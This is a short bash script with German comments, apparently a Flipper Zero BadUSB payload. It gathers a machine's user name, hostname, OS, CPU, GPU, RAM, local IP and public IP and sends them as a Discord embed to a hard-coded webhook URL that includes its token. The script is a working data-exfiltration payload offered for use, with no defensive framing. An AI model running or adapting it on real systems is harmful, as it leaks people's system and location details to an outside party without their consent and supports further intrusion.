#!/bin/bash

# --- Systeminfos einsammeln ---
u=$(whoami)
h=$(hostname)
o=$(grep "^PRETTY_NAME" /etc/os-release | cut -d'"' -f2)
cpu=$(lscpu | grep "Model name" | cut -d':' -f2 | xargs)
gpu=$(lspci | grep -E "VGA|3D" | cut -d':' -f3 | xargs)
ram=$(free -h | awk '/^Mem:/ {print $2}')
lip=$(hostname -I | awk '{print $1}')
pip=$(curl -s https://api.ipify.org)

# --- Discord Embed bauen (als JSON) ---
json=$(cat <<EOF
{
  "username": "FlipperZero",
  "embeds": [{
    "title": "🛰️ Flipper Zero – System Report (Linux)",
    "color": 5814783,
    "fields": [
      {"name": "👤 User", "value": "$u", "inline": true},
      {"name": "🖥️ Hostname", "value": "$h", "inline": true},
      {"name": "⚙️ CPU", "value": "$cpu", "inline": false},
      {"name": "🎮 GPU", "value": "$gpu", "inline": false},
      {"name": "💾 RAM", "value": "$ram", "inline": true},
      {"name": "📀 OS", "value": "$o", "inline": true},
      {"name": "🌐 Local IP", "value": "$lip", "inline": true},
      {"name": "🌍 Public IP", "value": "$pip", "inline": true}
    ]
  }]
}
EOF
)

# --- Webhook-URL ---
webhook="https://discord.com/api/webhooks/1415429711433044009/UBeb6qyEj9GUE9uh4H0fXslUx6cF23P3zVS1gDJ6RNlQT4E-eASC-_ChDD2pP-9phGvU"

# --- Abschicken ---
curl -H "Content-Type: application/json" -d "$json" "$webhook"
